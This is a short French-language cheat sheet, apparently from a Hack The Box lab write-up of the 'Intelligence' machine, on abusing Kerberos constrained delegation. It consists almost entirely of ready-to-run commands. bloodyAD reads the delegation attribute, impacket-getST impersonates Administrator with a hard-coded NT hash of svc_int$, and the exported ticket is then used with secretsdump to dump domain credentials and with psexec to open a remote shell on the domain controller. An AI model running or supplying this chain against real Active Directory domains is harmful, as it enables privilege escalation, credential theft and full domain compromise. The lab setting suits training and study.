#  Vérifie le SPN exact dans AllowedToDelegateTo avec :
```bash
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DC-NAME> --host <IP_DC> get object '<COMPTE_CIBLE>' --attr msDS-AllowedToDelegateTo
```

###  Étape 1 — Obtenir un ticket en se faisant passer pour Administrator (S4U2Proxy) :
```bash 

impacket-getST \
  -spn 'www/dc.intelligence.htb' \        # SPN cible (celui dans AllowedToDelegateTo)
  -impersonate Administrator \             # utilisateur qu'on usurpe
  -hashes ':HASH_NT_DE_SVC_INT' \         # hash NT de svc_int$
  'intelligence.htb/svc_int$'             # compte qui délègue
  
impacket-getST -spn 'www/dc.intelligence.htb' -impersonate Administrator -hashes ':4a92d8714f2d85a58289ec1e41858b1b' 'intelligence.htb/svc_int$'   
```
### **Étape 2 — Utiliser le ticket pour se connecter en tant qu'Administrator :**


```bash
# Exporter le ticket
export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

# Se connecter au DC
impacket-secretsdump -k -no-pass dc.intelligence.htb

# Ou obtenir un shell
impacket-psexec -k -no-pass dc.intelligence.htb
```
